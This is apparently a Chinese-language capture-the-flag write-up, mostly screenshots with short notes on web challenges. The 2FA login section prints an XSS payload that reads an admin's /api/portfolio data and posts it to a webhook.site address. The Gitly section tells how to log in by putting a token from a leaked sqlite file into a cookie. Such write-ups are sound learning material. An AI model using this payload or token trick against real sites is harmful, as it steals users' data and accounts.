...
## Welcome
FLAG就在PDF
![](https://i.imgur.com/bx50XkB.png)

## Robot
努力算數學，就有FLAG啦!
![](https://i.imgur.com/3Y93ZDt.png)
...
使用guest直接登入
![](https://i.imgur.com/Vr2SoPx.png)

發現有2FA
![](https://i.imgur.com/K2XTmg9.png)

需要使用admin登入
![](https://i.imgur.com/ttAUKsm.png)
...
![](https://i.imgur.com/HkgWrN4.png)

這題需要使用XSS去偷admin的資料，但不是偷cookie，所以這題比較少人解

Payload
```
<img src="#" onerror="fetch("/api/portfolio").then(res=>res.json()).then(res=>fetch("https://webhook.site/3923ff74-968d-46db-bb20-727f2068df0e",{method:"POST",body:JSON.stringify(res)}))">
```
...
## Gitly
一個Gitly網頁
![](https://i.imgur.com/3IsmsMV.png)

使用source code內的gitly.sqlite，裡面的token設定到cookie就能登入
![](https://i.imgur.com/scQe2IP.png)

但裡面功能好像都用不了
![](https://i.imgur.com/gbI89f4.png)

只有New repository，能發出請求
![](https://i.imgur.com/N9yzXwt.png)
...
![](https://i.imgur.com/M1F2ghg.png)

# 結束

解出Web三題，其他Reverse,Pwn都不會QQ
![](https://i.imgur.com/tAFddYC.png)